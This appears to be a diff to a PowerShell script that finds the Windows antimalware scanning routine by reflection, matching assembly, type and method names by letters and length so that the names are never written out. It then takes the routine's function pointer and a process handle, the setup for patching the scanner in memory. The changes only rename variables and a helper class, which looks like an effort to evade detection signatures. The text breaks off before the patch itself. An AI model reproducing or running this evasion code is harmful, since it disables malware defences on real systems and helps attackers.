@@ -1,33 +1,30 @@
-$Assemblies = [appdomain]::currentdomain.getassemblies()
-$Assemblies |
-  ForEach-Object {
+$asmList = [appdomain]::currentdomain.getassemblies()
+$asmList | ForEach-Object {
     if($_.Location -ne $null){
-   	 $split1 = $_.FullName.Split(",")[0]
-   	 If($split1.StartsWith('S') -And $split1.EndsWith('n') -And $split1.Length -eq 28) {
-   		 $Types = $_.GetTypes()
-   	 }
+        $asmName = $_.FullName.Split(",")[0]
+        If($asmName.StartsWith('S') -And $asmName.EndsWith('n') -And $asmName.Length -eq 28) {
+            $typeList = $_.GetTypes()
+        }
     }
 }
 
-$Types |
-  ForEach-Object {
+$typeList | ForEach-Object {
     if($_.Name -ne $null){
-   	 If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
-   		 $Methods = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
-   	 }
+        If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
+            $mList = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
+        }
     }
 }
 
-$Methods |
-  ForEach-Object {
+$mList | ForEach-Object {
     if($_.Name -ne $null){
-   	 If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
-  		 $MethodFound = $_
-   	 }
+        If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
+            $scanMethod = $_
+        }
     }
 }
 
-[IntPtr] $MethodPointer = $MethodFound.MethodHandle.GetFunctionPointer()
-[IntPtr] $Handle = [APIs]::GetCurrentProcess()
+[IntPtr] $MethodPointer = $scanMethod.MethodHandle.GetFunctionPointer()
+[IntPtr] $Handle = [NtHelpers]::GetCurrentProcess()
 $dummy = 0
 $ApiReturn = $false
